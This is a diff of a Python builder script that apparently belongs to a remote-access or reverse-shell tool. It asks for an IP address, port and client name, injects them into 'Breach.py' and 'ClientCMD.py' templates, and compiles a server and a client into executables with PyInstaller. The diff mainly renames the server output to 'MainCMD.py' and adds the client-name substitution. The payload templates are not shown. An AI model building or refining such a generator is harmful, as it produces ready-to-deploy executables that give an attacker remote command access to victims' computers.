@@ -41,29 +41,23 @@ sleep(1.5)
 clientName = Write.Input("  [>] Enter the client name -> ", Colors.green_to_cyan, interval=0.025)
 sleep(1.5)
 
-with open("Breach.py", "r") as file:
-    f = file.read()
+with open("Breach.py", "r") as f:
+    upt = f.read().replace("IP_ADRESS", ipAdress).replace("IP_PORT", ipPort)
 
-upt = f.replace("IP_ADRESS", ipAdress)
-upt = upt.replace("IP_PORT", ipPort)
-
-with open("Breach.py", "w") as file2:
-    file2.write(upt)
+with open("MainCMD.py", "w") as f:
+    f.write(upt)
 
 
-with open("ClientCMD.py", "r") as file3:
-    fi = file3.read()
+with open("ClientCMD.py", "r") as f:
+    upt2 = f.read().replace("IP_ADRESS", ipAdress).replace("IP_PORT", ipPort).replace("CLIENT_NAME", clientName)
 
-upt2 = fi.replace("IP_ADRESS", ipAdress)
-upt2 = upt2.replace("IP_PORT", ipPort)
-
-with open(fname + ".py", "w") as file4:
-    file4.write(upt2)
+with open(fname + ".py", "w") as f:
+    f.write(upt2)
 
 
 output_folder = current_directory + "\\EXE" 
 clientScript = os.path.join(current_directory, f"{fname}.py")
-serverScript = os.path.join(current_directory, "Breach.py")
+serverScript = os.path.join(current_directory, "MainCMD.py")
 
 subprocess.run([
     "pyinstaller",
@@ -73,7 +67,6 @@ subprocess.run([
     "--distpath", output_folder,
     serverScript
 ], shell=True)
-
 
 subprocess.run([
     "pyinstaller",
@@ -87,14 +80,13 @@ subprocess.run([
 ], shell=True)
 
 
-
 shutil.rmtree('build', ignore_errors=True)
 try:
     os.remove(fname + ".spec")
 except:
     pass
 try:
-    os.remove("Breach.spec")
+    os.remove("MainCMD.spec")
 except:
     pass
 
